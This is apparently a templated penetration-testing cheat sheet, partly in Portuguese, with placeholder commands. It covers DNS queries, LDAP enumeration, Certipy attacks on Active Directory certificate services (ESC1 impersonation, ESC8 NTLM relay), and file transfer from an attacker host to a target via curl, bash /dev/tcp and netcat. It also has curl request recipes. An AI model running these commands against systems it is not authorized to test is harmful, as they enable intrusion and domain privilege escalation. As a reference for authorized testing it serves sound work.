commands.title: Transferência completa de zona DNS

commands.title: Consultar registros TXT
commands.command: dig @{{dns_server}} TXT '{{domain}}'

commands.title: Outras consultas DNS
commands.command:
# Consultar Name Servers autoritativos
dig @{{dns_server}} NS {{domain}}

# Consultar o Start of Authority
dig @{{dns_server}} SOA {{domain}}

# Resolver o domínio para IPv4
dig @{{dns_server}} A {{target_host}}

# Consultar servidores responsáveis por e-mail
dig @{{dns_server}} MX {{domain}}

# Procurar por um alias DNS
dig @{{dns_server}} CNAME {{domain}}

# Consultar tipos de registros disponíveis
dig @{{dns_server}} ANY {{domain}}

# Consultar endereço IPv6
dig @{{dns_server}} {{domain}} AAAA

# Consultar quais autoridades certificadoras emitem certificados TLS
dig @{{dns_server}} {{domain}} CAA

# Consultar registros de serviços
dig @{{dns_server}} {{domain}} SRV

# Consultar chaves DNSSEC públicas na zona
dig @{{dns_server}} {{domain}} DNSKEY

# Consultar o registro Delegation Signer
dig @{{dns_server}} {{domain}} DS

commands.title: Executar enumeração DNS reversa

commands.title: LDAP Enumeration

# Find users

# Find computers

nxc ldap {{ip}} -u '{{username}}' -p '{{password}}' -d '{{domain}}' --groups

commands.title: Certipy
commands.command:
# Enumerate templates
certipy find -u '{{ldap_bind}}' -p '{{password}}' -dc-ip {{dc_ip}}

# ESC1 - Enrollee supplies subject
certipy req -u '{{ldap_bind}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca_name}}' -template '{{cert_template}}' -upn '{{target_user}}@{{domain}}'

# ESC4 - Consultar configuração do template (sem modificar ACL)
certipy template -u '{{ldap_bind}}' -p '{{password}}' -template '{{cert_template}}' -save-configuration template-backup.json

# ESC8 - NTLM relay to ADCS HTTP
certipy relay -target 'http://{{ca_host}}' -template '{{cert_template}}'

# Authenticate with certificate (PKINIT deve ser suportado pelo ambiente)
certipy auth -pfx '{{pfx_file}}' -dc-ip {{dc_ip}}

commands.title: Attacker -> Target (Linux)
commands.command:
# Python HTTP server

# On target - wget

# On target - curl
curl http://{{attacker_ip}}:{{service_port}}/arquivo.txt -o /tmp/arquivo.txt

# No alvo - Bash puro, download HTTP/1.0 (não suporta chunked/HTTPS)
exec 3<>/dev/tcp/{{attacker_ip}}/{{service_port}}
printf 'GET /arquivo.txt HTTP/1.0\r\nHost: {{attacker_ip}}\r\n\r\n' >&3
sed '1,/^\r$/d' <&3 > /tmp/arquivo.txt
exec 3<&- 3>&-

# Netcat
# Attacker:
nc -lvnp {{lport}} < ./arquivo.txt
# Target:
nc {{attacker_ip}} {{lport}} > ./arquivo.txt

# SCP
scp ./arquivo.txt {{username}}@{{ip}}:/tmp/arquivo.txt

# Base64
# Attacker:
base64 -w0 ./arquivo.txt; echo
# Target:
echo "base64string" | base64 -d > ./arquivo.txt

commands.title: GET
commands.command:
# GET simples
curl -i 'http://{{domain}}{{http_port}}/'

# GET com parâmetros
curl -i 'http://{{domain}}{{http_port}}/search?{{http_param}}=admin&page=1'

# GET com URL encoding automático
curl -G --data-urlencode 'q=hello world' --data-urlencode 'page=2' 'http://{{domain}}{{http_port}}/search'

commands.title: POST
commands.command:
# POST application/x-www-form-urlencoded
curl -i -X POST 'http://{{domain}}{{http_port}}/login' -d 'username={{username}}&password={{password}}'

# POST com variáveis
curl -i 'http://{{domain}}{{http_port}}/login' --data-urlencode 'username={{username}}' --data-urlencode 'password={{password}}'

# POST com dados carregados de arquivo
curl -i 'http://{{domain}}{{http_port}}/submit' --data @./formulario.txt

commands.title: POST
commands.command:
# POST com JSON
curl -i -X POST 'http://{{domain}}{{http_port}}{{http_path}}' -H 'Content-Type: application/json' -d '{"name":"admin","role":"user"}'

# POST JSON com --json
curl -i 'http://{{domain}}{{http_port}}{{http_path}}' --json '{"name":"admin","role":"user"}'

# POST JSON a partir de um arquivo
curl -i 'http://{{domain}}{{http_port}}{{http_path}}' --json @./body.json

commands.title: Upload de arquivos
commands.description: Símbolo @ após -F file= indica ao cURL que o conteúdo deve ser lido de um arquivo local.
commands.command:
# Upload multipart/form-data
curl -i 'http://{{domain}}{{http_port}}/upload' -F 'file=@./arquivo.txt'

# Upload com campos adicionais
curl -i 'http://{{domain}}{{http_port}}/upload' -F 'file=@./arquivo.txt' -F 'description=teste'

# Upload especificando Content-Type
curl -i 'http://{{domain}}{{http_port}}/upload' -F 'file=@./imagem.png;type=image/png'

# Upload via PUT
curl -i -T './arquivo.txt' 'http://{{domain}}{{http_port}}/files/arquivo.txt'

commands.title: HTTP Methods
commands.command:
# PUT - substituir recurso
curl -i -X PUT 'http://{{domain}}{{http_port}}{{http_path}}/1' -H 'Content-Type: application/json' -d '{"name":"teste"}'

# PATCH - atualizar parte do recurso
curl -i -X PATCH 'http://{{domain}}{{http_port}}{{http_path}}/1' -H 'Content-Type: application/json' -d '{"active":true}'

# DELETE - remover recurso de teste
curl -i -X DELETE 'http://{{domain}}{{http_port}}{{http_path}}/1'

# OPTIONS - investigar métodos
curl -i -X OPTIONS 'http://{{domain}}{{http_port}}{{http_path}}'

# HEAD - somente cabeçalhos
curl -I 'http://{{domain}}{{http_port}}/'

commands.title: Headers
commands.command:
# User-Agent personalizado
curl -i -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64)' 'http://{{domain}}{{http_port}}/'

# Requisição AJAX
curl -i -H 'X-Requested-With: XMLHttpRequest' 'http://{{domain}}{{http_port}}{{http_path}}'

# Accept e Content-Type
curl -i -H 'Accept: application/json' -H 'Content-Type: application/json' 'http://{{domain}}{{http_port}}{{http_path}}'

# Referer e Origin
curl -i -H 'Referer: http://{{domain}}{{http_port}}/dashboard' -H 'Origin: http://{{domain}}{{http_port}}' 'http://{{domain}}{{http_port}}/api/users'

# Virtual host via Host
curl -i -H 'Host: {{domain}}' 'http://{{ip}}{{http_port}}/'

# Testar X-Forwarded-For
curl -i -H 'X-Forwarded-For: 127.0.0.1' 'http://{{domain}}{{http_port}}/'

commands.title: Cookies e Autenticação
commands.command:
# Enviar cookie
curl -i -b 'session=SESSAO_AQUI' 'http://{{domain}}{{http_port}}/dashboard'

# Salvar cookies recebidos
curl -i -c cookies.txt 'http://{{domain}}{{http_port}}/login'

# Reutilizar cookies
curl -i -b cookies.txt 'http://{{domain}}{{http_port}}/dashboard'

# Basic Auth com senha solicitada interativamente
curl -i -u '{{username}}' 'http://{{domain}}{{http_port}}/protected'

# Bearer Token
curl -i -H 'Authorization: Bearer {{jwt_token}}' 'http://{{domain}}{{http_port}}/api/me'

commands.title: Proxy, debugging e coleta de dados
commands.command:
# Interceptar com Burp Suite
curl -i -x 'http://127.0.0.1:{{proxy_port}}' 'http://{{domain}}{{http_port}}/'

# Mostrar detalhes da requisição e resposta
curl -v 'http://{{domain}}{{http_port}}/'

# Seguir redirecionamentos
curl -i -L 'http://{{domain}}{{http_port}}/'

# Ignorar certificado TLS inválido (laboratório)
curl -k -i 'https://{{domain}}{{http_port}}/'

# Salvar cabeçalhos e corpo em arquivos separados
curl -sS -D headers.txt -o body.html 'http://{{domain}}{{http_port}}/'

# Mostrar apenas status HTTP
curl -sS -o /dev/null -w '%{http_code}\n' 'http://{{domain}}{{http_port}}/'

xfreerdp3 /v:{{ip}} /u:'{{username}}' /p:'{{password}}' /d:'{{domain}}' /cert:ignore +dynamic-resolution

# Criar share via RDP
xfreerdp3 /v:{{ip}} /u:'{{username}}' /p:'{{password}}' /d:'{{domain}}' /cert:ignore +dynamic-resolution /drive:"{{share_name}},{{pasta_compartilhada_kali}}
# Dentro da sessão RDP, abra o explorador de arquivos e digite:
\\tsclient\share
